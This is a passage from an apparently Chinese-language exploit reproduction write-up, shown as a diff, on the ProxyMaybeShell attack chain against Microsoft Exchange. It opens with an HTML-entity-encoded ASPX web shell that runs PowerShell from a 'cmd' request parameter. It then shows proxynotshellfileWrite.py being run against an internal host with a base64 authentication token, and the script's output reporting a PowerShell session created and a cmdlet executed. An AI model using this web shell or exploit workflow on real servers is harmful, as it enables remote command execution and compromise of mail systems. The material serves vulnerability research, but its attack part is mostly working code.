+&#x3c;&#x25;&#x40;&#x20;&#x50;&#x61;&#x67;&#x65;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x43;&#x23;&#x22;&#x20;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x4d;&#x6f;&#x64;&#x65;&#x6c;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x73;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x41;&#x73;&#x73;&#x65;&#x6d;&#x62;&#x6c;&#x79;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2c;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x31;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x30;&#x2c;&#x43;&#x75;&#x6c;&#x74;&#x75;&#x72;&#x65;&#x3d;&#x6e;&#x65;&#x75;&#x74;&#x72;&#x61;&#x6c;&#x2c;&#x50;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x4b;&#x65;&#x79;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x33;&#x31;&#x42;&#x46;&#x33;&#x38;&#x35;&#x36;&#x41;&#x44;&#x33;&#x36;&#x34;&#x45;&#x33;&#x35;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x63;&#x23;&#x22;&#x20;&#x72;&#x75;&#x6e;&#x61;&#x74;&#x3d;&#x22;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x74;&#x65;&#x20;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x72;&#x79;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x46;&#x61;&#x63;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x4f;&#x70;&#x65;&#x6e;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x3d;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x28;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x28;&#x22;&#x4f;&#x75;&#x74;&#x2d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3c;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x20;&#x3d;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x49;&#x6e;&#x76;&#x6f;&#x6b;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x6c;&#x6f;&#x73;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x66;&#x6f;&#x72;&#x65;&#x61;&#x63;&#x68;&#x20;&#x28;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x6f;&#x62;&#x6a;&#x20;&#x69;&#x6e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x41;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x4c;&#x69;&#x6e;&#x65;&#x28;&#x6f;&#x62;&#x6a;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x63;&#x61;&#x74;&#x63;&#x68;&#x28;&#x45;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2e;&#x46;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x28;&#x22;&#x45;&#x72;&#x72;&#x6f;&#x72;&#x3a;&#x20;&#x7b;&#x30;&#x7d;&#x22;&#x2c;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x76;&#x6f;&#x69;&#x64;&#x20;&#x50;&#x61;&#x67;&#x65;&#x5f;&#x4c;&#x6f;&#x61;&#x64;&#x28;&#x6f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x65;&#x72;&#x2c;&#x20;&#x45;&#x76;&#x65;&#x6e;&#x74;&#x41;&#x72;&#x67;&#x73;&#x20;&#x65;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x2e;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x73;&#x5b;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x5d;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+```
+
+ - ![](./pics/proxymaybeshell1.png)
+
+然后将编码后的数据放入[proxynotshellfileWrite.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py)脚本中如下：
+
+ - ![](./pics/proxymaybeshell2.png)
+
+运行shell写入脚本
+
+``` bash
+root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain/proxymaybeshell/ProxyMaybeShell-main# python2 proxynotshellfileWrite.py https://10.0.102.210 "VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==" 1
+[+] Create powershell session
+[+] Got ShellId success
+[+] Run keeping alive request
+[+] Success keeping alive
+[+] Run cmdlet new-offlineaddressbook
+[+] Create powershell pipeline
+[+] Run keeping alive request
+[+] Success remove session
+```
+
+可以执行部分powershell命令，至此proxymaybeshell复现暂时告一段落
+
+ - ![](./pics/proxymaybeshell3.png)
+
+ - ![](./pics/proxymaybeshell4.png)
 
 
 
